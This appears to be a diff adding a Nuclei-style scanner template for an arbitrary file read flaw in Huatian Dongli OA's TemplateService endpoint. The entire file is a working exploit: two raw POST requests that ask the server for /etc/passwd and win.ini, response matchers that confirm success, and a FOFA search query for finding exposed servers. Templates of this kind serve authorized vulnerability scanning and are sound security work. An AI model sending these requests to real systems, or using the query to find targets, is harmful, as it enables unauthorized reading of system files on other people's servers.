@@ -1,0 +1,42 @@
+id: huatiandongli-templateservice-fileread
+
+info:
+  name: 华天动力 OA TemplateService 任意文件读取
+  author: zan8in
+  severity: high
+  description: |
+    华天动力 OA Buffalo TemplateService.getHtmlContent 可传入本地路径读取 /etc/passwd 或 win.ini。
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: body="/OAapp/WebObjects/OAapp.woa"
+  tags: huatian,oa,lfi,buffalo
+
+http:
+  - raw:
+      - |
+        POST /OAapp/bfapp/buffalo/TemplateService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <buffalo-call>
+        <method>getHtmlContent</method>
+        <string>/etc/passwd</string>
+        </buffalo-call>
+      - |
+        POST /OAapp/bfapp/buffalo/TemplateService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <buffalo-call>
+        <method>getHtmlContent</method>
+        <string>C://windows/win.ini</string>
+        </buffalo-call>
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200 && regex("root:.*:0:0:", body_1)'
+          - 'status_code_2 == 200 && contains(body_2, "bit app support")'
+        condition: or
